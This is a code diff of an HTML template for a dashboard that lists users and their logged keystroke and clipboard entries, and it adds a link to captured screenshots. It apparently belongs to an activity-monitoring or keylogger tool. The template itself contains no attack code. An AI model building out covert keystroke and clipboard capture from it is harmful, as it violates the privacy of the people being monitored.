@@ -24,63 +24,32 @@
           <h2>Users</h2>
           <ul class="list-unstyled">
             {% if unique_users %} {% for user in unique_users %}
-            <li class="user-item">
-              {{ user }}
-              <div class="tags-container mt-2">
-                <span
-                  class="tag"
-                  onclick="filterLogs('{{ user }}', 'KeyStroke')"
-                  >KeyStroke</span
-                >
-                <span
-                  class="tag"
-                  onclick="filterLogs('{{ user }}', 'Clipboard')"
-                  >Clipboard</span
-                >
-              </div>
-            </li>
+            <li class="user-item">{{ user }}</li>
             {% endfor %} {% else %}
             <p>No users found yet.</p>
             {% endif %}
           </ul>
         </aside>
         <main class="col-md-10 py-3">
-          {% if user_logs %} {% for user, logs in user_logs.items() %}
-          <section class="user-section">
-            <h2>{{ user[0] }}</h2>
-            <p>{{ user[1] }}</p>
-            <div class="row row-data">
-              {% for log in logs %}
-              <div
-                class="col-md-8 log-entry my-2 p-2 border rounded key-stroke"
-              >
-                <p>{{ log.text }}</p>
-                <p class="timestamp text-left">{{ log.timestamp }}</p>
-              </div>
-              {% endfor %}
+          {% if all_logs %}
+          <div class="row row-data">
+            {% for log in all_logs %}
+            <div class="col-md-8 log-entry my-2 p-2 border rounded">
+              <p>{{ log.text }}</p>
+              <p class="timestamp text-left">{{ log.timestamp }}</p>
             </div>
-            {% if clipboard_logs %}
-            <section class="clipboard-section">
-              <div class="row row-data">
-                {% for log in clipboard_logs %}
-                <div
-                  class="col-md-8 log-entry my-2 p-2 border rounded clipboard"
-                >
-                  <p>{{ log.text }}</p>
-                  <p class="timestamp text-left">{{ log.timestamp }}</p>
-                </div>
-                {% endfor %}
-              </div>
-            </section>
-            {% endif %}
-          </section>
-          {% endfor %} {% endif %}
-          <!-- Alert if no logs found -->
-          {% if not user_logs and not clipboard_logs %}
+            {% endfor %}
+          </div>
+          {% else %}
+          <!-- Display a message if no logs are found -->
           <div class="alert alert-info text-center" role="alert">
             No logs found yet. Monitor activity for data to appear.
           </div>
           {% endif %}
+          <hr />
+          <div class="text-center">
+            <a href="/screenshots" class="btn btn-primary">View Screenshots</a>
+          </div>
         </main>
       </div>
     </div>
@@ -90,6 +59,5 @@
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-    <script src="{{ url_for('static', filename='app.js') }}"></script>
   </body>
 </html>
